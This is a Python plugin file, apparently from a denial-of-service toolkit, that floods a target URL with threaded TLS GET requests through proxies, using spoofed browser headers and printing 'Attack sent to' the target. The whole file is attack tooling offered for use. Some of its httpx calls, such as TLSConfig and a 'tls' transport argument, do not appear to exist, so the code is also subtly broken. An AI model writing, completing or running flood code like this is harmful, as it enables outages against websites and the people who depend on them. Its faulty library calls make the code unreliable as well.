# plugins/tls_flood_v3.py
import threading
import httpx
import time

def send_req_tls_flood_v3(url, packet, results, proxies, headers):
    tls_versions = {
        "TLSv1": httpx.TLSConfig(ssl_version="TLSv1"),
        "TLSv1.2": httpx.TLSConfig(ssl_version="TLSv1.2"),
        "TLSv1.3": httpx.TLSConfig(ssl_version="TLSv1.3")
    }
    
    for _ in range(packet):
        try:
            tls_version = tls_versions["TLSv1.3"]
            
            with httpx.Client(proxies=proxies, headers=headers, timeout=5.0, transport=httpx.HTTPTransport(retries=2, tls=tls_version)) as client:
                r = client.get(url)
                results.append(f"GET {url} STATUS CODE {r.status_code}")
        except httpx.ConnectTimeout:
            results.append(f"GET {url} CONNECTION TIMEOUT")
        except httpx.RequestError as e:
            results.append(f"GET {url} ERROR: {str(e)}")

def run_threads_tls_v3(url, packets, threads, results, proxies, headers):
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(target=send_req_tls_flood_v3, args=(url, packets, results, proxies, headers))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def send_requests_with_timeout_tls_v3(url, packets, threads, timeout=120, proxy=None):
    results = []
    start_time = time.time()
    
    proxies = {
        "http": proxy,
        "https": proxy
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'sessionid=123456789; token=abcdef123456'
    }
    
    print(f"Attack sent to:\nUrl: {url}\nPackets: {packets}\nTimeout: {timeout} (2 Min)\nUsing Proxy: {proxy if proxy else 'No proxy'}")

    run_threads_tls_v3(url, packets, threads, results, proxies, headers)

    elapsed_time = time.time() - start_time
    if elapsed_time < timeout:
        time.sleep(timeout - elapsed_time)

    for result in results:
        print(result)

# send_requests_with_timeout_tls_v3("https://example.com", packets=50, threads=50, proxy="http://myproxy:3128")
